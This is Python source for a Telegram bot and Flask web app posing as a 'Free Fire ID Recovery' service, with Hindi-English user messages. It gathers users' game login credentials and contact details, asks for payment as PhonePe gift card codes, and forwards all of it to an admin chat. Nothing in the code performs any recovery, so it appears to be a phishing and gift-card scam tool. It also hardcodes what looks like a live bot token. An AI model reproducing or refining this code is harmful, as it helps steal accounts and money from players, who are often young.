import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from flask import Flask, render_template, request, jsonify
import threading
import random

TOKEN = '9015143190:AAGaL2nkNpxlK6_1zutMDQdSU4YR6TNp1hk'
ADMIN_CHAT_ID = '8899967086'

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

user_temp_storage = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    banner_url = "https://images.unsplash.com/photo-1542751371-adc38448a05e?w=800"
    
    caption_text = (
        "🔥 **Free Fire ID Recovery Mini App** 🔥\n\n"
        "Namaste! Apne account ki details bharne aur plan select karne ke liye niche diye gaye button par click karein:"
    )
    
    # Web App Button (Yahan aapko baad me apna live URL dalna hoga)
    markup = InlineKeyboardMarkup()
    web_app_url = "https://obviously-very-cooler-lan.trycloudflare.com"
 # Tunnel URL yahan aayega
    markup.add(InlineKeyboardButton("🚀 Open Recovery Web App", web_app=WebAppInfo(url=web_app_url)))
    
    bot.send_photo(message.chat.id, photo=banner_url, caption=caption_text, parse_mode='Markdown', reply_markup=markup)

# Flask route to handle Web App form submission
@app.route('/submit', methods=['POST'])
def handle_web_submission():
    data = request.json
    telegram_id = data.get('user_id')
    
    user_temp_storage[telegram_id] = data
    
    # User ko bot ke through payment ke liye prompt bhejna
    service_parts = data.get('service').split(' | ')
    price = service_parts[2] if len(service_parts) > 2 else "₹1199"
    
    bot.send_message(
        telegram_id,
        f"💳 **Payment Step:**\n\n"
        f"Aapne chuna hai: **{data.get('service')}**\n"
        f"Total Amount: **{price}**\n\n"
        f"Kripya PhonePe se **{price}** ka Gift Card kharid kar uska **Gift Card Code / Voucher Code** yahan message me bhejein:",
        parse_mode='Markdown'
    )
    
    return jsonify({'status': 'success'})

@bot.message_handler(func=lambda message: True)
def handle_payment_code(message):
    chat_id = message.chat.id
    if chat_id in user_temp_storage:
        data = user_temp_storage[chat_id]
        ticket_id = f"#FF-{random.randint(10000, 99999)}"
        
        service_parts = data.get('service').split(' | ')
        plan = service_parts[0]
        action = service_parts[1]
        price = service_parts[2]
        
        admin_text = (
            f"🚨 **New Mini App Order & Payment!**\n\n"
            f"🎟️ **Ticket ID:** `{ticket_id}`\n"
            f"📦 **Plan:** {plan}\n"
            f"⚙️ **Service:** {action} ({price})\n\n"
            f"👤 Name: {data.get('name')}\n"
            f"🆔 UID: `{data.get('uid')}`\n"
            f"📞 Contact: {data.get('contact')}\n"
            f"🌐 Login Method: {data.get('login_method')}\n"
            f"🔐 Credentials: {data.get('credentials')}\n\n"
            f"💳 **PhonePe Gift Card Code:**\n{message.text}"
        )
        
        admin_markup = InlineKeyboardMarkup(row_width=2)
        admin_markup.add(
            InlineKeyboardButton("✅ Received / Approve", callback_data=f"approve_{chat_id}"),
            InlineKeyboardButton("❌ Not Received / Reject", callback_data=f"reject_{chat_id}")
        )
        
        bot.send_message(ADMIN_CHAT_ID, admin_text, parse_mode='Markdown', reply_markup=admin_markup)
        bot.reply_to(message, f"✅ **Request aur Gift Card code admin ke paas bhej diye gaye hain!**\n\n🎟️ Ticket ID: `{ticket_id}`", parse_mode='Markdown')
        
        del user_temp_storage[chat_id]

@bot.callback_query_handler(func=lambda call: call.data.startswith(('approve_', 'reject_')))
def admin_approval(call):
    action, user_chat_id = call.data.split('_')
    user_chat_id = int(user_chat_id)
    
    if action == 'approve':
        bot.answer_callback_query(call.id, "Approved!")
        bot.edit_message_text(call.message.text + "\n\n🟢 **[ STATUS: APPROVED ✅ ]**", call.message.chat.id, call.message.id, parse_mode='Markdown')
        bot.send_message(user_chat_id, "🎉 Aapka payment verify ho gaya hai! Process shuru kar diya gaya hai.")
    else:
        bot.answer_callback_query(call.id, "Rejected!")
        bot.edit_message_text(call.message.text + "\n\n🔴 **[ STATUS: REJECTED ❌ ]**", call.message.chat.id, call.message.id, parse_mode='Markdown')
        bot.send_message(user_chat_id, "❌ Payment verification failed. Kripya sahi code ke sath dobara try karein.")

# Run Flask in a separate thread
def run_flask():
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

if __name__ == '__main__':
    threading.Thread(target=run_flask).start()
    bot.infinity_polling()
